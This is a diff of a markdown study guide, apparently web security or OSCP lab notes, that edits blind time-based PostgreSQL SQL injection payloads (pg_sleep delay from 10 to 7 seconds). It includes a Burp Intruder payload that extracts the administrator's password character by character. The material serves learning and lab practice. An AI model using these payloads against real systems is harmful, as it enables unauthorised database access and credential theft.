@@ -1446,7 +1446,7 @@ csrf=TOKEN&username=administrator
 >Blind SQL injection with time delays is tricky to ***identify***, fuzzing involves educated guessing as OffSec also taught me in OSCP. The below payload will perform conditional case to delay the response by 10 seconds if positive SQL injection ***identified***. 
 
 ```SQL
-'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--
 ```  
 
 ![blind-time-delay SQLi](images/blind-time-delay.png)  
@@ -1454,10 +1454,10 @@ csrf=TOKEN&username=administrator
 >Burp Intruder attack going through each character of password to get valid time delay response if match identified before moving to next character in password string.  
 
 ```SQL
-TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users--
 ```  
 
->Using cluster bomb attack type with two payload, first for the length of the password ```1..20``` and then second using characters ```a..z``` and numbers ```0..9```. Add the Response Received column to the intruder attack results to sort by and observe the ```7``` seconds or  more delay as positive response.  
+>Using cluster bomb attack type with two payload, first for the length of the password ```1..20``` and then second using characters ```a..z``` and numbers ```0..9```. Add the **Response Received** column to the intruder attack results to sort by and observe the ```7``` seconds or  more delay as positive response.  
 
 ![blind cluster bomb SQLi](images/blind-cluster-bomb.png)  
 
